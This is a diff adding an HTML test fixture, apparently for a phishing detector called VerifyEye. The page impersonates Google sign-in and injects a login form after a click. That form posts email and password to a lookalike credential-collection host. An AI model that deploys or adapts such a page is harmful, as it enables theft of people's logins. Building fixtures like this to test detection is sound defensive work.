@@ -1,0 +1,44 @@
+<!doctype html>
+<!-- LOCAL TEST FIXTURE ONLY — never deployed. A fake "SPA" that injects a
+     Google-impersonating login form late (via JS, after a click), the way
+     Reddit/React apps do. Used to prove VerifyEye's MutationObserver catches
+     forms that aren't in the initial HTML. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Google Account — Sign in</title>
+  <style>
+    body { font-family: -apple-system, Arial, sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
+    .card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,.1); width: 320px; text-align: center; }
+    h1 { font-size: 22px; font-weight: 400; }
+    input { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
+    button { background: #1a73e8; color: #fff; border: 0; padding: 12px 20px; border-radius: 6px; font-size: 15px; cursor: pointer; }
+    #open { margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Sign in to Google</h1>
+    <p>to continue to Gmail</p>
+    <!-- No credential form here on load. It gets injected by JS below,
+         simulating an SPA that renders the login view after an interaction. -->
+    <div id="slot"></div>
+    <button id="open">Continue</button>
+  </div>
+
+  <script>
+    // Simulate SPA behaviour: the login form only exists AFTER the user clicks,
+    // changing the URL hash too (like client-side routing to /signin).
+    document.getElementById('open').addEventListener('click', () => {
+      location.hash = '#/signin';            // URL changes, no page reload
+      document.getElementById('slot').innerHTML = `
+        <form action="https://google-account-verify.com/collect" method="post">
+          <input type="email" placeholder="Email or phone" autocomplete="username" />
+          <input type="password" placeholder="Enter your password" />
+          <button type="submit">Next</button>
+        </form>`;
+      document.getElementById('open').style.display = 'none';
+    });
+  </script>
+</body>
+</html>
